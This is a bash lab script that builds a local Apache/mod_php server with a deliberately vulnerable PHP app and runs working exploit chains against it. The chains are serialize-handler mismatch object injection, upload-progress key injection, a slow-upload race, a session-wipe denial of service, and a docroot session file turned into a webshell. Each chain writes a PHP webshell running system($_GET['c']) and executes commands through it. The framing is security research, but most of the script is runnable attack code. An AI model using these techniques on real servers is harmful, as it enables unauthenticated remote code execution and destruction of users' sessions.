#!/bin/bash
# =============================================================================
# php2shell session-gap lab - Apache 2.4.52 prefork + mod_php 8.1.2 (Ubuntu)
#
#   T1  A-app : serialize_handler mismatch via app ini_set (write=php_serialize,
#               read=php) -> attacker OBJECT injected, gadget destructor fires,
#               webshell written to docroot, executed over HTTP = RCE
#   T2  A-up  : session.upload_progress KEY INJECTION, per-dir php_value
#               php_serialize on the POST dir (write) + default php read ->
#               OBJECT injection, app stores ZERO attacker input, RCE
#   T3  A-race: same but ALL-STOCK session ini (cleanup=1, strict=1): slow
#               upload + concurrent reader race (hook persists key mid-upload)
#   T4  DoS   : stock php write handler -> invalid-key rejection AND victim
#               session file wiped (unauth session-destroy primitive)
#   T6  B2    : RCE via docroot save_path (session file = webshell, SetHandler)
# =============================================================================
ART=/mnt/c/Users/andre/Downloads/php2shell-claude
ROOT=/tmp/p2s_ap
PORT=18220
URL=http://127.0.0.1:$PORT
MOD=$(ls /usr/lib/apache2/modules/libphp*.so 2>/dev/null | head -1)
[ -n "$MOD" ] || { echo "no mod_php"; exit 1; }
PASS=0; FAIL=0
ok()  { echo "[PASS] $1"; PASS=$((PASS+1)); }
bad() { echo "[FAIL] $1"; FAIL=$((FAIL+1)); }
note(){ echo "[..]   $1"; }

rm -rf $ROOT; mkdir -p $ROOT/html/w $ROOT/sess $ROOT/html/s
echo hi > $ROOT/f.txt

# ---------------------------------------------------------------- victim app
cat > $ROOT/html/index.php <<'EOF'
<?php echo "OK " . PHP_VERSION . " " . php_sapi_name() . "\n";
EOF
cat > $ROOT/html/lib.php <<'EOF'
<?php
class MarkerGadget {
    public $cmd; public $tag = "TAG";
    public function __wakeup()   { file_put_contents("/tmp/p2s_ap/MARK_WAKE.txt", "wakeup " . $this->cmd . "\n", FILE_APPEND); }
    public function __destruct() { file_put_contents("/tmp/p2s_ap/MARK_DEST.txt", "destruct " . $this->cmd . "\n", FILE_APPEND); }
}
class DeferredWriter {   // "deferred cache writer" gadget (destructor side effect)
    public $path; public $data;
    public function __destruct() { file_put_contents($this->path, $this->data); }
}
EOF
cat > $ROOT/html/read.php <<'EOF'
<?php
require __DIR__ . "/lib.php";
header("Content-Type: text/plain");
if (!empty($_GET["create"])) { session_start(); $_SESSION["pref"] = "keepme"; session_write_close(); echo "[read.php create] stored pref=keepme sid=" . session_id() . "\n"; exit; }
session_start();
echo "[read.php] handler=" . ini_get("session.serialize_handler") . " PHP " . PHP_VERSION . " " . php_sapi_name() . "\n";
foreach ($_SESSION as $k => $v) {
    echo "  key=" . var_export($k, true) . " -> " . gettype($v);
    if (is_object($v)) { echo " class=" . get_class($v); if (isset($v->path)) echo " path=" . $v->path; }
    echo "\n";
}
echo "[read.php] done\n";
EOF
cat > $ROOT/html/w/prefs.php <<'EOF'
<?php
header("Content-Type: text/plain");
ini_set("session.use_strict_mode", "0");
ini_set("session.serialize_handler", "php_serialize");   // app config / framework default
session_start();
$_SESSION["prefs"] = (string)($_POST["theme"] ?? "");    // attacker string, stored raw
session_write_close();
echo "[prefs.php] stored theme, handler=" . ini_get("session.serialize_handler") . "\n";
EOF
# passive upload targets: one in the php_serialize dir (/w/), one at docroot
cat > $ROOT/html/w/up.php <<'EOF'
<?php header("Content-Type: text/plain"); echo "[up.php] upload handled (php_serialize dir)\n";
EOF
cat > $ROOT/html/up.php <<'EOF'
<?php header("Content-Type: text/plain"); echo "[up.php] upload handled (default php dir)\n";
EOF

# ---------------------------------------------------------------- payloads
P_MARK=$(php $ART/gen_payloads.php | grep '^P_MARK='  | cut -d= -f2-)
P_UPWR=$(php $ART/gen_payloads.php | grep '^P_UPWR='  | cut -d= -f2-)
P_PRWR=$(php $ART/gen_payloads.php | grep '^P_PRWR='  | cut -d= -f2-)
echo "[lab] P_UPWR=$P_UPWR"

# ---------------------------------------------------------------- apache
# start_apache <extra-conf-lines> <save_path> <workers:N>
start_apache() {
  stop_apache
  cat > $ROOT/httpd.conf <<EOF
ServerName localhost
Listen 127.0.0.1:$PORT
PidFile $ROOT/httpd.pid
ErrorLog $ROOT/error.log
LogLevel warn
TypesConfig /etc/mime.types
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
LoadModule dir_module /usr/lib/apache2/modules/mod_dir.so
LoadModule mime_module /usr/lib/apache2/modules/mod_mime.so
LoadModule php_module $MOD
DocumentRoot $ROOT/html
<Directory $ROOT/html>
  Require all granted
  DirectoryIndex index.php
  php_admin_value session.save_path ${2:-$ROOT/sess}
  php_admin_value session.upload_progress.min_freq 0
  php_admin_value session.upload_progress.prefix upload_progress_
  php_admin_flag display_errors off
</Directory>
# --- MISMATCH: POST/upload dir runs php_serialize for its request lifetime ---
<Directory $ROOT/html/w>
  php_value session.serialize_handler php_serialize
</Directory>
<FilesMatch \\.php$>
  SetHandler application/x-httpd-php
</FilesMatch>
# --- B2 stage: session files inside docroot, executed ---
<Directory $ROOT/html/s>
  <FilesMatch "^sess_">
    SetHandler application/x-httpd-php
  </FilesMatch>
</Directory>
$1
EOF
  : > $ROOT/error.log; rm -f $ROOT/sess/sess_* $ROOT/html/s/sess_* 2>/dev/null
  if [ "${3:-1}" = "1" ]; then
    echo "MaxRequestWorkers 1" >> $ROOT/httpd.conf
    /usr/sbin/apache2 -X -f $ROOT/httpd.conf > $ROOT/x.log 2>&1 &
    AP_PID=$!
    disown
  else
    printf "MaxRequestWorkers %s\nStartServers %s\nMinSpareServers %s\nMaxSpareServers %s\n" "$3" "$3" "$3" "$3" >> $ROOT/httpd.conf
    /usr/sbin/apache2 -f $ROOT/httpd.conf -k start > $ROOT/x.log 2>&1
  fi
  for i in $(seq 1 40); do curl -s -o /dev/null --max-time 2 $URL/ && break; sleep 0.4; done
}
stop_apache() {
  for P in $(pgrep -f "X -f $ROOT/httpd.conf" 2>/dev/null); do kill -9 $P 2>/dev/null; done
  [ -f $ROOT/httpd.pid ] && /usr/sbin/apache2 -f $ROOT/httpd.conf -k stop 2>/dev/null
  [ -f $ROOT/httpd.pid ] && kill -9 $(cat $ROOT/httpd.pid) 2>/dev/null
  for i in $(seq 1 20); do curl -s -o /dev/null --max-time 1 $URL/ 2>/dev/null || break; sleep 0.3; done
}

echo "=================================================================="
echo " lab: Apache prefork + $MOD"
start_apache "php_admin_value session.upload_progress.cleanup 0
php_admin_value session.use_strict_mode 0" "" 1
V=$(curl -s --max-time 3 $URL/)
[ -n "$V" ] && ok "lab up: $V" || bad "lab up"

# ================================================== T1: app-level mismatch
note "T1: ini_set(php_serialize) write route -> default php read route"
rm -f $ROOT/MARK_*.* $ROOT/html/prefs_shell.php
SID1=t1sid000000000000000000000000
curl -s -o /dev/null -b "PHPSESSID=$SID1" --data-urlencode "theme=$P_PRWR" $URL/w/prefs.php
echo "--- session file after write route ---"
hexdump -C $ROOT/sess/sess_$SID1 | head -6
echo "--- read route (default php handler) ---"
curl -s -b "PHPSESSID=$SID1" $URL/read.php
grep -q "Failed to decode session object" $ROOT/error.log && note "decode failed (expected on php_serialize-written files) -> session destroyed -> gadget destructors fired during teardown"
if [ -f $ROOT/html/prefs_shell.php ]; then
  ok "T1: DeferredWriter::__destruct fired, prefs_shell.php written into docroot"
  head -c 60 $ROOT/html/prefs_shell.php; echo " <- webshell content"
  R=$(curl -s --get --data-urlencode "c=id; uname -r; hostname" "$URL/prefs_shell.php")
  echo "[T1 RCE receipt] prefs_shell.php?c=id;uname%20-r;hostname -> $R"
  case "$R" in *uid=*) ok "T1 RCE: command executed via webshell ($R)";; *) bad "T1 RCE: webshell did not execute";; esac
else bad "T1: prefs_shell.php never written (no destruct)"; fi

# ============================== T2: upload-progress key injection (cleanup=0)
note "T2: upload_progress KEY injection; POST dir php_serialize, read php; app stores NOTHING"
rm -f $ROOT/MARK_*.* $ROOT/html/up_shell.php
SID2=t2sid000000000000000000000000
python3 $ART/up_client.py $PORT full $SID2 "$P_UPWR" /w/up.php
sleep 0.5
echo "--- session file after multipart POST ---"
hexdump -C $ROOT/sess/sess_$SID2 2>/dev/null | head -8
curl -s -b "PHPSESSID=$SID2" $URL/read.php
if [ -f $ROOT/html/up_shell.php ]; then
  ok "T2: key-injection object -> DeferredWriter destruct -> up_shell.php in docroot"
  R=$(curl -s --get --data-urlencode "c=id; uname -r; hostname" "$URL/up_shell.php")
  echo "[T2 RCE receipt] -> $R"
  case "$R" in *uid=*) ok "T2 RCE: command executed via webshell ($R)";; *) bad "T2 RCE: no uid output";; esac
else bad "T2: up_shell.php never written"; fi

# ============================== T3: ALL-STOCK session ini + slow-upload RACE
note "T3: stock cleanup=1/strict=1/min_freq=1: slow upload + concurrent readers"
start_apache "" "" 6
rm -f $ROOT/MARK_*.* $ROOT/html/up_race_shell.php $ROOT/race_read.log
P_RACE=$(php $ART/gen_payloads.php | grep '^P_RACE=' | cut -d= -f2-)
# victim session created by the php_serialize WRITE side (realistic: in a
# mismatch app the session data is written by the php_serialize route; the
# hook must be able to decode it to append its key)
rm -f $ROOT/jar
curl -s -c $ROOT/jar --data-urlencode "theme=legit-light" $URL/w/prefs.php
SID3=$(awk '/PHPSESSID/{print $NF}' $ROOT/jar)
echo "[T3] victim session id: $SID3"
echo "[T3] session before attack (php_serialize format): $(cat $ROOT/sess/sess_$SID3 2>/dev/null)"
# slow multipart POST (~5s) in background; hammer read.php concurrently
python3 $ART/up_client.py $PORT slow $SID3 "$P_RACE" /w/up.php > $ROOT/slow.log 2>&1 &
SLOWPID=$!
HITS=0
for i in $(seq 1 60); do
  curl -s -m 2 -b "PHPSESSID=$SID3" $URL/read.php >> $ROOT/race_read.log 2>&1
  [ -f $ROOT/html/up_race_shell.php ] && { HITS=$i; break; }
  kill -0 $SLOWPID 2>/dev/null || break
done
wait $SLOWPID 2>/dev/null
echo "[T3] read attempts until shell appeared: ${HITS:-none} | slow client: $(cat $ROOT/slow.log)"
echo "[T3] session file after race: $(cat $ROOT/sess/sess_$SID3 2>/dev/null | head -c 200)"
if [ -f $ROOT/html/up_race_shell.php ]; then
  R=$(curl -s --get --data-urlencode "c=id; uname -r; hostname" "$URL/up_race_shell.php")
  echo "[T3 RCE receipt] -> $R"
  case "$R" in *uid=*) ok "T3 RCE: ALL-STOCK session ini (cleanup=1, strict=1), slow-upload race technique ($R)";; *) bad "T3: shell present, no exec";; esac
else bad "T3: race did not land (rerun; hook write window is short)"; fi

# ============================== T4: stock rejection + session WIPE
note "T4: default php write handler: invalid-key rejection + victim session wipe"
start_apache "php_admin_value session.use_strict_mode 0" "" 1
SID4=t4sid000000000000000000000000
curl -s -o /dev/null -b "PHPSESSID=$SID4" "$URL/read.php?create=1"
echo "--- victim session before poison ---"; cat $ROOT/sess/sess_$SID4; echo
python3 $ART/up_client.py $PORT full $SID4 "$P_UPWR" /up.php
sleep 0.5
SZ=$(stat -c %s $ROOT/sess/sess_$SID4 2>/dev/null || echo missing)
echo "--- victim session after poison (size=$SZ) ---"
echo "--- error.log session lines ---"; grep -i "session" $ROOT/error.log | tail -4
grep -q "invalid key" $ROOT/error.log && ok "T4: invalid-key rejection logged (patched 8.1 behavior)" || bad "T4: no invalid-key warning"
[ "$SZ" = "0" ] && ok "T4: victim session data WIPED (truncated to 0) - unauth session-wipe" || note "T4: file size=$SZ (not wiped)"

# ============================== T6/B2: docroot save_path webshell (no POP)
note "T6/B2: save_path inside docroot + SetHandler -> session file IS a webshell"
start_apache "php_admin_value session.use_strict_mode 0" "$ROOT/html/s" 1
SID5=t5sid000000000000000000000000
curl -s -o /dev/null -b "PHPSESSID=$SID5" --data-urlencode "theme=<?php system(\$_GET['c']); __halt_compiler();" $URL/w/prefs.php
echo "--- docroot session file content ---"
head -c 200 $ROOT/html/s/sess_$SID5 2>/dev/null; echo
R=$(curl -s --get --data-urlencode "c=id; uname -r; hostname" "$URL/s/sess_$SID5")
echo "[B2 RCE receipt] /s/sess_$SID5?c=... -> $R"
case "$R" in *uid=*) ok "B2 RCE: session-file webshell executed ($R)";; *) bad "B2: no exec";; esac

stop_apache
echo "=================================================================="
echo " RESULT: $PASS passed, $FAIL failed | lab artifacts: $ROOT"
echo "=================================================================="
